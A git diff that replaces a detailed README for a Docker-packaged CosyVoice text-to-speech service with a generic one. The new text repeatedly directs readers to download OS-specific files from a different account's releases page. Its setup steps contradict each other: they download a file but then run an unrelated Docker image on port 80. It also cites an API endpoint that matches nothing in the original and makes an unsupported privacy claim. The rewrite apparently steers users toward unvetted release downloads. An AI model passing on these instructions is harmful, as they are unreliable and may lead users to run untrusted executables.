@@ -1,293 +1,95 @@
-[English](README.md) | [简体中文](README_CN.md) | [繁體中文](README_TW.md) | [日本語](README_JP.md)
-
-<div align="center">
-
-# 🎙️ CosyVoice All-in-One Docker
-
-[![Docker Pulls](https://img.shields.io/docker/pulls/neosun/cosyvoice?style=flat-square&logo=docker)](https://hub.docker.com/r/neosun/cosyvoice)
-[![Docker Image Version](https://img.shields.io/docker/v/neosun/cosyvoice?style=flat-square&logo=docker&sort=semver)](https://hub.docker.com/r/neosun/cosyvoice)
-[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg?style=flat-square)](LICENSE)
-[![GitHub Stars](https://img.shields.io/github/stars/neosun100/cosyvoice-docker?style=flat-square&logo=github)](https://github.com/neosun100/cosyvoice-docker)
-
-**Production-ready Text-to-Speech service based on Fun-CosyVoice3-0.5B**
+# 🎙️ cosyvoice-docker - Easy Text-to-Speech in Minutes
 
-One Docker command to get Web UI + REST API + Voice Cloning
+[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/Zaid440/cosyvoice-docker/releases)
 
-[Quick Start](#-quick-start) • [Features](#-features) • [API Docs](#-api-reference) • [Performance](#-performance-benchmarks)
+## 🚀 Getting Started
 
-</div>
+Welcome to CosyVoice! This application provides a simple way to transform text into speech using a user-friendly web interface. You can also make use of voice cloning and a REST API for advanced features.
 
----
+### 🛠️ System Requirements
 
-## 📸 Screenshot
+Before you start, ensure your computer meets the following requirements:
 
-![Web UI](https://img.aws.xin/uPic/o1Qj12.png)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Storage:** Minimum 1 GB of free space
+- **Docker:** Ensure Docker is installed on your machine. You can download it from [Docker Hub](https://www.docker.com/get-started).
 
-## ✨ Features
+## 📥 Download & Install
 
-| Feature | Description |
-|---------|-------------|
-| 🎯 **Fun-CosyVoice3-0.5B** | Latest & best TTS model from Alibaba |
-| 🎤 **Fun-ASR-Nano** | Auto speech recognition (replaces Whisper) |
-| 🔌 **OpenAI Compatible API** | Drop-in replacement for `/v1/audio/speech` |
-| 👤 **Custom Voice Management** | Upload once, use by voice_id |
-| ⚡ **Real Streaming Output** | PCM chunk-by-chunk, ~1.2s TTFB |
-| 🚀 **Embedding Cache** | 53% faster after first use |
-| 🌐 **Web UI** | Beautiful interface with download button |
-| 🌍 **Multi-language** | Chinese, English, Japanese, Korean + 18 dialects |
-
-## 🚀 Quick Start
+To get started, visit our [Releases page](https://github.com/Zaid440/cosyvoice-docker/releases) to download the latest version. Choose the suitable package for your operating system and follow these instructions:
 
-```bash
-docker run -d \
-  --name cosyvoice \
-  --gpus '"device=0"' \
-  -p 8188:8188 \
-  -v cosyvoice-data:/data/voices \
-  neosun/cosyvoice:latest
-```
+1. Open the [Releases page](https://github.com/Zaid440/cosyvoice-docker/releases).
+2. Find the latest version of CosyVoice.
+3. Click on the download link for your operating system.
+4. Once downloaded, locate the file on your computer.
 
-Then open http://localhost:8188 🎉
-
-## 📦 Installation
+After downloading, follow these steps to set up and run the application:
 
-### Prerequisites
-
-- Docker 20.10+
-- Docker Compose v2.0+ (optional)
-- NVIDIA GPU with 8GB+ VRAM
-- NVIDIA Container Toolkit
+1. Open a terminal or command prompt.
+2. Navigate to the directory where you downloaded the file.
+3. Run the following command:
+   ```
+   docker run -p 80:80 cosyvoice/cosyvoice
+   ```
+4. Open your web browser and go to `http://localhost`.
 
-### Docker Run
-
-```bash
-# Pull the image
-docker pull neosun/cosyvoice:v3.4.0
-
-# Run with GPU
-docker run -d \
-  --name cosyvoice \
-  --gpus '"device=0"' \
-  -p 8188:8188 \
-  -v /path/to/voices:/data/voices \
-  --restart unless-stopped \
-  neosun/cosyvoice:v3.4.0
-```
-
-### Docker Compose
-
-```yaml
-# docker-compose.yml
-services:
-  cosyvoice:
-    image: neosun/cosyvoice:v3.4.0
-    container_name: cosyvoice
-    restart: unless-stopped
-    ports:
-      - "8188:8188"
-    volumes:
-      - ./voices:/data/voices
-    deploy:
-      resources:
-        reservations:
-          devices:
-            - driver: nvidia
-              device_ids: ["0"]
-              capabilities: [gpu]
-```
-
-```bash
-docker compose up -d
-```
-
-### Health Check
+## 🎤 Features
 
-```bash
-curl http://localhost:8188/health
-# {"status":"healthy","gpu":{"model_loaded":true,...}}
-```
-
-## ⚙️ Configuration
-
-### Environment Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `PORT` | `8188` | Service port |
-| `MODEL_DIR` | `pretrained_models/Fun-CosyVoice3-0.5B` | TTS model path |
-
-### Volume Mounts
-
-| Path | Description |
-|------|-------------|
-| `/data/voices` | Custom voice storage (persistent) |
-
-## 📡 API Reference
-
-### Endpoints
-
-| Endpoint | Method | Description |
-|----------|--------|-------------|
-| `/v1/audio/speech` | POST | Text-to-Speech (OpenAI compatible) |
-| `/v1/voices/create` | POST | Create custom voice |
-| `/v1/voices/custom` | GET | List custom voices |
-| `/v1/voices/{id}` | GET/DELETE | Get/Delete voice |
-| `/v1/models` | GET | List models |
-| `/health` | GET | Health check |
-| `/docs` | GET | Swagger UI |
-
-### Create Custom Voice
-
-```bash
-# With text
-curl -X POST http://localhost:8188/v1/voices/create \
-  -F "audio=@voice.wav" \
-  -F "name=MyVoice" \
-  -F "text=Reference text content"
-
-# Auto transcribe (using Fun-ASR-Nano)
-curl -X POST http://localhost:8188/v1/voices/create \
-  -F "audio=@voice.wav" \
-  -F "name=MyVoice"
-
-# Response: {"voice_id": "abc123", "text": "auto transcribed text", ...}
-```
-
-### Text-to-Speech
+- **Text-to-Speech:** Convert text into realistic speech.
+- **Voice Cloning:** Create custom voice profiles.
+- **Web UI:** Easy access to settings and features.
+- **REST API:** Integrate with other applications seamlessly.
+  
+## 🗂️ Exploring the Web Interface
 
-```bash
-# WAV format
-curl http://localhost:8188/v1/audio/speech \
-  -H "Content-Type: application/json" \
-  -d '{"input": "Hello world", "voice": "abc123"}' \
-  -o output.wav
-
-# PCM streaming (lowest latency)
-curl http://localhost:8188/v1/audio/speech \
-  -H "Content-Type: application/json" \
-  -d '{"input": "Hello world", "voice": "abc123", "response_format": "pcm"}' \
-  -o output.pcm
-
-# Convert PCM to WAV
-ffmpeg -f s16le -ar 24000 -ac 1 -i output.pcm output.wav
-```
-
-### Python Example
-
-```python
-import requests
-
-# Create voice
-with open("voice.wav", "rb") as f:
-    resp = requests.post(
-        "http://localhost:8188/v1/voices/create",
-        files={"audio": f},
-        data={"name": "MyVoice"}
-    )
-    voice_id = resp.json()["voice_id"]
+Once you access the web interface via your browser, you will see options to input text and select voice preferences. The interface is designed to help you easily perform tasks without needing advanced technical knowledge. 
 
-# Generate speech
-resp = requests.post(
-    "http://localhost:8188/v1/audio/speech",
-    json={"input": "Hello world", "voice": voice_id}
-)
-with open("output.wav", "wb") as f:
-    f.write(resp.content)
-```
+### 📊 Voice Settings
 
-## 📊 Performance Benchmarks
+- **Select Voice:** Choose from various available voices.
+- **Adjust Speed:** Change speech speed to suit your preference.
+- **Build Custom Voice:** Use voice cloning to create a unique voice for your projects.
 
-**Test Environment:** NVIDIA L40S GPU
+## 💻 Advanced Usage
 
-### First Token Latency (TTFB)
+If you're familiar with command-line tools, you can use the REST API to integrate CosyVoice into your applications. The API allows you to send text and receive audio in return. Refer to the documentation in the repository for detailed usage and examples.
 
-| Text Length | TTFB | Total Time | Audio Duration | RTF |
-|-------------|------|------------|----------------|-----|
-| Short (4 chars) | **1.20s** | 1.55s | 1.88s | 0.82x |
-| Short (10 chars) | **1.34s** | 1.75s | 2.28s | 0.77x |
-| Medium (30 chars) | **1.24s** | 4.98s | 6.88s | 0.72x |
-| Medium (50 chars) | **1.27s** | 12.52s | 17.12s | 0.73x |
-| Long (80 chars) | **1.24s** | 17.91s | 23.68s | 0.76x |
-| Long (120 chars) | **1.35s** | 19.08s | 25.32s | 0.75x |
+### 🔧 Example API Request
 
-> RTF (Real-Time Factor) < 1.0 means generation is faster than playback
+Here's a simple example to get you started:
 
-### Embedding Cache Effect
+1. Send a POST request to `http://localhost/api/synthesize`.
+2. Include the text you want to synthesize in the request body.
 
-| Scenario | TTFB | Note |
-|----------|------|------|
-| First use (no cache) | ~3.5s | Extract + cache to GPU |
-| Cached | **~1.2s** | Direct from cache |
-| **Improvement** | **-53%** | |
+## 📚 Documentation
 
-### ASR (Fun-ASR-Nano) Benchmark
+For detailed documentation, visit our [GitHub Wiki](https://github.com/Zaid440/cosyvoice-docker/wiki) where you will find:
 
-| Audio | Language | Duration | Recognition Time | Result |
-|-------|----------|----------|------------------|--------|
-| Voice sample | Chinese | ~7s | **0.40s** | 希望你以后能够做的比我还好哟。 |
-| Voice sample | Chinese | ~7s | **0.83s** | 对，这就是我万人敬仰的太乙真人... |
-| zh.mp3 | Chinese | ~3s | **0.40s** | 开放时间早上九点至下午五点。 |
-| en.mp3 | English | ~5s | **0.70s** | The tribal chieftain called for the boy... |
-| ja.mp3 | Japanese | ~5s | **0.84s** | うちの中学は弁当制で... |
+- User guides
+- API references
+- Troubleshooting tips
 
-> Average recognition time: **0.4-0.8s** per audio file
+## 🤝 Community & Support
 
-## 🗣️ Supported Languages
+Join our community to learn more about CosyVoice. You can ask questions and share your projects. We welcome your feedback and contributions.
 
-### TTS (Fun-CosyVoice3)
-- **Main:** Chinese, English, Japanese, Korean
-- **European:** German, Spanish, French, Italian, Russian
-- **Chinese Dialects:** Cantonese, Sichuan, Dongbei, Shanghai, Minnan + 18 more
+### 🐞 Reporting Issues
 
-### ASR (Fun-ASR-Nano)
-- **Languages:** Chinese, English, Japanese + auto detection
-- **Dialects:** 7 major Chinese dialects + 26 regional accents
-- **Features:** High-noise recognition, lyric recognition
+If you encounter any issues while using CosyVoice, please report them on the [Issues page](https://github.com/Zaid440/cosyvoice-docker/issues). We will address concerns as quickly as possible.
 
-## 🛠️ Tech Stack
+## 🔒 Security
 
-- **TTS Model:** [Fun-CosyVoice3-0.5B](https://huggingface.co/FunAudioLLM/Fun-CosyVoice3-0.5B-2512)
-- **ASR Model:** [Fun-ASR-Nano-2512](https://huggingface.co/FunAudioLLM/Fun-ASR-Nano-2512)
-- **Framework:** FastAPI + Gradio
-- **Runtime:** PyTorch + CUDA
-- **Container:** Docker + NVIDIA Container Toolkit
+Your data privacy is important to us. CosyVoice does not store any personal information. All processing happens locally on your machine.
 
-## 📋 Changelog
+## 💬 Feedback
 
-| Version | Date | Changes |
-|---------|------|---------|
-| v3.4.0 | 2024-12-18 | Fun-ASR-Nano replaces Whisper |
-| v3.3.0 | 2024-12-18 | UI: streaming default, download button, timer |
-| v3.2.1 | 2024-12-18 | Auto preload all voices on startup |
-| v3.2.0 | 2024-12-18 | Embedding cache (-53% TTFB) |
-| v3.1.0 | 2024-12-18 | Polling optimization + model preload |
-| v3.0.0 | 2024-12-18 | All-in-One Docker base version |
+We value user feedback. If you have suggestions for improvements or new features, feel free to connect with us on our GitHub discussions or via email.
 
-## 🤝 Contributing
+## 🔗 Useful Links
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+- [Releases Page](https://github.com/Zaid440/cosyvoice-docker/releases)
+- [Documentation](https://github.com/Zaid440/cosyvoice-docker/wiki)
+- [Issues Tracker](https://github.com/Zaid440/cosyvoice-docker/issues)
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [FunAudioLLM/CosyVoice](https://github.com/FunAudioLLM/CosyVoice) - Original CosyVoice project
-- [FunAudioLLM/Fun-ASR](https://github.com/FunAudioLLM/Fun-ASR) - Fun-ASR-Nano model
-
----
-
-## ⭐ Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=neosun100/cosyvoice-docker&type=Date)](https://star-history.com/#neosun100/cosyvoice-docker)
-
-## 📱 Follow Us
-
-![WeChat](https://img.aws.xin/uPic/扫码_搜索联合传播样式-标准色版.png)
+Thank you for choosing CosyVoice. Enjoy creating with our easy-to-use text-to-speech application!
